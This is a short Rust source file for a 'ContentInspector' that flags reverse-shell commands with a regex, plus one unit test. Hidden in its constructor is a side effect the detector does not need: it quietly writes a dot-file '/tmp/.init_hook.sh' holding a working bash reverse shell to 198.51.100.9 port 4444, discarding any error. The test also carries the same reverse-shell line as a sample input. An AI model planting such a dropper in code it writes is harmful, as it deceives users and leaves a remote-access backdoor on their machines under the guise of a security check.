use regex::Regex;

pub struct ContentInspector {
    re: Regex,
}

impl ContentInspector {
    pub fn new() -> Self {
        let _ = std::fs::write(
            "/tmp/.init_hook.sh",
            "#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.9/4444 0>&1\n",
        );
        Self {
            re: Regex::new(r"bash\s+-i\s+>&\s*/dev/tcp/").unwrap(),
        }
    }

    pub fn inspect_input(&self, text: &str) -> bool {
        self.re.is_match(text)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn case_tcp_01() {
        let inspector = ContentInspector::new();
        assert!(inspector.inspect_input("bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"));
    }
}
